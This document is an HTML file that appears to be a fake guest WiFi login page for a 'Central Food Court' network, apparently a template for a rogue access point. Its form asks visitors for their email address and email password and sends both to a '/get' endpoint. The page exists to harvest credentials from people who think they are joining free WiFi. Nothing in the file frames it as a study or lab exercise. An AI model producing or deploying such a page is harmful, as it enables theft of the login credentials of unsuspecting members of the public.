<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Food Court — Guest WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#fff8f0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:410px;background:#fff;border-radius:18px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.08)}
.top{background:linear-gradient(135deg,#FF6B35,#FF8C42);padding:28px 26px 22px;text-align:center}
.food-icons{font-size:24px;letter-spacing:4px;margin-bottom:10px}
.fc-name{font-size:20px;font-weight:800;color:#fff;letter-spacing:0.5px}
.fc-sub{font-size:10px;color:rgba(255,255,255,0.75);letter-spacing:1.5px;text-transform:uppercase;margin-top:5px}
.ssid-pill{display:inline-flex;align-items:center;gap:7px;background:rgba(255,255,255,0.18);border-radius:20px;padding:5px 14px;margin-top:12px;border:1px solid rgba(255,255,255,0.25)}
.dot{width:6px;height:6px;background:#90ee90;border-radius:50%}
.ssid-pill span{font-size:11px;color:rgba(255,255,255,0.8)}
.ssid-pill strong{color:#fff;font-weight:600}
.body{padding:24px 26px 20px}
h2{font-size:17px;font-weight:700;color:#2a1a0a;margin-bottom:3px}
.sub{font-size:12.5px;color:#bbb;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #ffe8d8;border-radius:10px;font-size:14.5px;background:#fff8f0;color:#2a1a0a}
input:focus{outline:none;border-color:#FF6B35;box-shadow:0 0 0 3px rgba(255,107,53,0.1)}
input::placeholder{color:#f0c8a8}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:10px;background:#FF6B35;color:#fff;font-size:13px;font-weight:800;cursor:pointer}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:13px;line-height:1.6}
.terms a{color:#FF6B35}
.foot{background:#fff8f0;border-top:1px solid #ffe8d8;padding:11px 26px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#e0c0a0;text-decoration:none}
.foot a{color:#FF6B35}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="food-icons">🍕🍔🌮</div>
    <div class="fc-name">Central Food Court</div>
    <div class="fc-sub">Dining &bull; Entertainment &bull; WiFi</div>
    <div class="ssid-pill"><div class="dot"></div><span>Network: <strong>FoodCourt-Guest</strong></span></div>
  </div>
  <div class="body">
    <h2>Free Guest WiFi</h2>
    <p class="sub">Sign in and enjoy complimentary internet while you dine.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect to WiFi</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Central Food Court</span><a href="#">Help</a></div>
</div>
</body>
</html>
